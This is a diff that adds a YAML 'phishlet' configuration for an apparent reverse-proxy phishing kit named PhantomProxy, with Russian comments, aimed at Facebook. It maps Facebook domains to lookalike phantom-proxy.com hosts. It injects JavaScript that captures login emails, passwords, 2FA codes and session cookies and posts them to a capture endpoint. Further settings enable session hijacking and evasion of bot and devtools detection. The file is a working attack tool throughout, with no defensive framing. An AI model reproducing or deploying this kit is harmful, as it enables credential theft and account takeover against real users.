@@ -1,0 +1,196 @@
+# ============================================================================
+# Facebook Phishlet
+# Полный перехват сессий Facebook (Meta)
+# ============================================================================
+
+id: facebook
+name: Facebook (Meta)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий Facebook:
+  - Вход по email/телефону
+  - 2FA подтверждение
+  - Перехват сессий
+  - Перехват данных профиля
+
+target:
+  primary: "www.facebook.com"
+  secondary:
+    - "facebook.com"
+    - "m.facebook.com"
+    - "mbasic.facebook.com"
+    - "business.facebook.com"
+    - "web.facebook.com"
+
+sub_filters:
+  - type: "domain"
+    from: "www.facebook.com"
+    to: "www.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "facebook.com"
+    to: "phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "m.facebook.com"
+    to: "m.phantom-proxy.com"
+    priority: 3
+
+  - type: "domain"
+    from: "static.xx.fbcdn.net"
+    to: "cdn.phantom-proxy.com"
+    priority: 100
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Facebook phishlet loaded');
+    
+    const capture = {
+      captureCredentials: function(form) {
+        const email = form.querySelector('input[type="email"]')?.value || 
+                      form.querySelector('input[type="text"]')?.value || '';
+        const password = form.querySelector('input[type="password"]')?.value || '';
+        
+        if (email || password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'facebook_credentials',
+              email: email,
+              password: password,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      capture2FA: function(code) {
+        if (code && code.length >= 6) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'facebook_2fa',
+              code: code,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      captureSession: function() {
+        const cookies = {
+          c_user: this.getCookie('c_user'),
+          xs: this.getCookie('xs'),
+          datr: this.getCookie('datr'),
+          sb: this.getCookie('sb'),
+          fr: this.getCookie('fr')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'facebook_session',
+            cookies: cookies,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    document.addEventListener('submit', function(e) {
+      capture.captureCredentials(e.target);
+    }, true);
+    
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT' && 
+          (e.target.name?.includes('approvals_code') || e.target.id?.includes('otp'))) {
+        if (e.target.value.length >= 6) {
+          capture.capture2FA(e.target.value);
+        }
+      }
+    }, true);
+    
+    window.addEventListener('load', function() {
+      capture.captureSession();
+    });
+    
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+  })();
+
+triggers:
+  - name: "facebook_login"
+    path_regex: "/login|/checkpoint"
+    actions:
+      - type: "capture_form"
+        fields: ["email", "pass", "password"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "facebook_2fa"
+    path_regex: "/checkpoint|/two_factor"
+    actions:
+      - type: "capture_form"
+        fields: ["approvals_code", "otp", "code"]
+      - type: "wait_for_input"
+        timeout: 180
+        
+  - name: "facebook_main"
+    host_regex: "www.facebook.com"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["c_user", "xs", "datr", "sb", "fr"]
+      - type: "session_hijack"
+        enabled: true
+
+cookies:
+  critical:
+    - "c_user"
+    - "xs"
+    - "datr"
+    - "sb"
+    - "fr"
+    
+  session:
+    - "wd"
+    - "x-referer"
+    
+  additional:
+    - "fbsr"
+    - "fbm"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+
+ssl:
+  min_version: "TLS1.2"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/facebook/"
